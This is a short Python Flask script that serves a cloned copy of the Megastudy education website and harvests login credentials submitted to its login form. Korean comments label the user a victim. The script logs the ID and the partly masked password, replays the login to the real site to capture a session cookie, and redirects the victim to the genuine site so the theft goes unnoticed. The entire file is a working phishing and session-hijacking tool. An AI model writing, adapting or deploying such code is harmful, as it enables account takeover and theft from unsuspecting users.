from flask import Flask, send_from_directory, request, redirect
from megastudy_replay import login_to_megastudy


app = Flask(__name__)

@app.route('/', defaults={'path': 'index.html'})
@app.route('/<path:path>')
def serve(path):
    return send_from_directory('static/megastudy_htttrack', path)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("loginid")  # 폼 필드 이름에 맞춰야 함
    password = request.form.get("loginpw")

    masked_password = '*' * min(5, len(password)) + password[5:] if password else ''

    print(f"입력된 피해자의 아이디: {username}")
    print(f"입력된 피해자의 패스워드: {masked_password}")

    cookie_value = login_to_megastudy(username, password)
    
    print("세션 쿠키 털었죠? :", cookie_value)

    return redirect("https://www.megastudy.net/") 

if __name__ == '__main__':
    app.run(debug=True)
